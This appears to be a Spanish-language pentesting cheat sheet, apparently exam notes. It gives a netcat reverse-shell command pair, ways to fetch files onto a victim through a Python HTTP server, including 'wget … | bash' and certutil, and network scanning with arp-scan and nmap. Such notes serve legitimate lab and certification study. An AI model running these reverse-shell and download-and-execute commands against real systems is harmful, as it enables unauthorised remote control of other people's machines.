## Uso de NetCat

El uso de NetCat nos ayuda a entablar conexiones (que generalmente es mediante reverse shells) hacia una máquina victima para ejecución remota de comandos.
https://www.revshells.com/

Máquina atacante:
``` bash
nc -lnvp 443
```

Máquina victima:
``` bash
sh -i >& /dev/tcp/ip atacante/443 0>&1
```

## Compartir archivos mediante un servidor http con python

Este método para compartir archivos nos es bastante útil debido a que mediante una petición http a nuestra máquina atacante podemos pasar archivos a la máquina victima.

Máquina atacante:
``` bash
python3 -m http.server 80
```

Máquina victima:
``` bash
wget http://ip atacente/archivo | bash (ejecución)
```

### Y para máquinas Windows?

Máquina atacante:
``` bash
python3 -m http.server 80
```

Máquina victima:
``` powershell
certutil -split -urlcache -f http://ip atacente/archivo nombre_final
```

## Reconocimiento de la red con ARP-SCAN o NETDISCOVER

Estas herramientas nos ayudan a identificar equipos dentro de nuestra red, y es útil para hacer posibles saltos dentro de una red para comprometer mas equipos.

Máquina atacante:
``` bash
arp-scan -I eth0 --localnet

netdiscover -i eth0 -r 192.160.1.0/24

nmap -sn 192.160.1.0/24
```

Mediante un ping podemos identificar a que SO nos estamos enfrentando:
- TTL -> 128 (Windows)
- TTL -> 64 (Linux)

## Escaneos básicos con NMAP

reconocimiento personalizado de nmap.
``` bash
nmap -p- -sS --open --min-rate 1500 -vvv -n -Pn IP -oN escaneo
```

una vez obtenidos los puertos expuestos podemos buscar versiones y descripción del puerto.
``` bash
nmap -sCV -pPuertosEncontrados
```

De aquí es mejor usar Metasploit junto con el script "vuln" de nmap porque no se puede acceder a internet desde la máquina del examen.

### Y si no encuentro puertos abiertos con NMAP?

Probablemente los puertos abiertos se encentren bajo el protocolo UDP

Escanearemos la máquina victima de la siguiente manera:
``` bash
nmap -sU --top-ports 200 --open --min-rate 1500 -vvv -n -Pn IP -oN escaneo
```

